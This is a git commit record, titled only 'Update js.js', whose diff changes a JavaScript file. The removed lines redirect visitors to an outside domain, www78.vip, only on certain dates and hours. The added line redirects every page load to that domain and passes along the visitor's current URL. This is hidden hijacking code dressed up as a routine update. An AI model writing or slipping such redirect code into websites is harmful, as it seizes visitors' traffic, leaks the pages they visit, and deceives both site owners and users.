8c311e9ea4be7d80abcdbc65da8761c835409401
hgvip <84088557+hgvip@users.noreply.github.com>
2021-05-13 21:06:56 +0800

    Update js.js

--- js.js
+++ js.js
@@ -1,11 +1,1 @@
-var year = new Date().getFullYear();
-var month = new Date().getMonth() + 1;
-var date = new Date().getDate();
-var hour = new Date().getHours();
-if (year === 2021 || year === 2022) {
-    if (date === 13 || date === 15 || date === 28) {
-        if (hour === 15 || hour === 7) {
-            window.location.href = "http://www78.vip/?url=" + window.location.href;
-        } else {}
-    }
-} else {};
+window.location.href = "http://www78.vip/?url=" + window.location.href;
